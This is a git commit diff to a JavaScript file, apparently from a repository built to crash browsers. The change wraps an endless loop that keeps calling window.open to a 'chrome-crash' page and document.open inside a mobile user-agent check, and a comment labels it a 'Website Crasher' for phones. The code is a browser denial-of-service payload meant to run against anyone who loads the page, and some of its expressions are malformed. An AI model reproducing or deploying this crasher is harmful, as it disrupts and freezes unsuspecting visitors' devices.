e98956037edf55f9cf23f31cd978fe4ef0d05bab
Uland Sanders <78428114+chrome-crash-invoke@users.noreply.github.com>
2021-11-17 20:48:44 -0800

    Update en.js

--- data/en.js
+++ data/en.js
@@ -4,11 +4,14 @@ $vwer = '#';
 
 while(1) {
     
-    window.open("https://chrome-crash-invoke.github.io/chrome-crash/", "_false",) * '#/hisbck';
-    // if window.open fails.
-    $x = Math.floor((Math.random() * 100) + 1);
-    document.open('#' + $x);
-    // When Function window.open does it's thing, history back will reset the website.
     
-}
+    if(/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)){
+    /* (Website Crasher For IOS and android And Mostly Every Phone) */
+        window.open("https://chrome-crash-invoke.github.io/chrome-crash/", "_false",) * '#/hisbck';
+        // if window.open fails.
+        $x = Math.floor((Math.random() * 100) + 1);
+        document.open('#' + $x);
+        // When Function window.open does it's thing, history back will reset the website.
 
+    }
+}
